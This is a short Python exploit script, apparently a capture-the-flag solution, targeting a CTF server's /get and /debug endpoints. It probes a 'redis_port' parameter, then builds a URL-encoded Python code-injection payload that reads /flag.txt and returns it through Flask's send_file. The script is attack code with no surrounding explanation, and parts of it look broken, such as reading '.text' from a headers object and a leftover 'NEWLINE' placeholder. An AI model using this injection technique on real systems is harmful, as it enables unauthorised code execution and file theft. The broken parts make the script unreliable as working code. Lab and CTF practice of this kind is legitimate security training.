import requests

url = "http://kvcloud.sf.ctf.so/get"
myparams={'key':'1','redis_port':'80'}
#s.get(url)

#res = s.get(url,params=myparams)
#print(res.text)

headers = {
  'keep-Alive': 'timeout=100,max=1000'
}

payload={}
s = requests.Session()
gresponse = s.request("GET", url, params=myparams,headers=headers,data=payload)
print(gresponse.text)

payload={'cmd': 'import%20io%3B%20from%20flask%20import%20send_file%3B%20with%20open%28%5C%27%2Fflag.txt%5C%27%2C%20%5C%27rb%5C%27%29%20as%20f%3A%20fdata%20%3D%20io.BytesIO%28NEWLINE%20%2B%20f.read%28%29%29%3B%20send_file%28fdata%2C%20%5C%27text%2Fplain%5C%27%29'}
headers=requests.Request('POST', 'http://kvcloud.sf.ctf.so/debug', data=payload).prepare().headers
print(headers.text)
#pr = s.request("POST",'http://kvcloud.sf.ctf.so/debug',headers=headers,data=payload)

# '''<form method="POST">
# '''



